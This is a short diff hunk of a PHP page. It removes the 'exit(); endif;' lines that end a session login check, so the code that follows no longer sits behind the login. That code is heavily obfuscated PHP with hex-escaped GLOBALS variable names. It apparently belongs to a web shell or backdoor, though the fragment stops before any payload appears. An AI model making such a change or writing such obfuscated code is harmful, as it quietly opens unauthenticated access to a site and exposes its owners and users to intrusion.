@@ -26,11 +26,6 @@ if (!$_SESSION['loggedIn']): ?>
     </form>
   </body>
 </html>
-
-<?php
-exit();
-endif;
-?>
 <?php ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x77\x63\x65s\x61\x79nw"] =
     "xp\x6c\x31";
 ${"G\x4c\x4fB\x41\x4c\x53"}["\x6f\x79\x65m\x61\x6ba\x63v\x67e"] = "\x6e\x61mas";
